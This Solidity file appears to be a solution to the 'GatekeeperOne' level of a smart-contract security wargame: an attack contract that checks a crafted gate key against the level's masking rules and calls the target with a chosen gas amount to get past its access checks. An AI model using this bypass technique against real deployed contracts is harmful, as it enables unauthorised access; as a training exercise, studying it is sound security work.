// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./lvl_13_GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public levelContract;

    constructor(address gateAddress) public {
        levelContract = GatekeeperOne(gateAddress);
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function testGateThree(bytes8 _gateKey)
        public
        gateThree(_gateKey)
        returns (bool)
    {
        return true;
    }

    function attack(bytes8 _gateKey, uint256 _gasToUse) public {
        bool success = levelContract.enter{gas: _gasToUse}(_gateKey);
    }
}
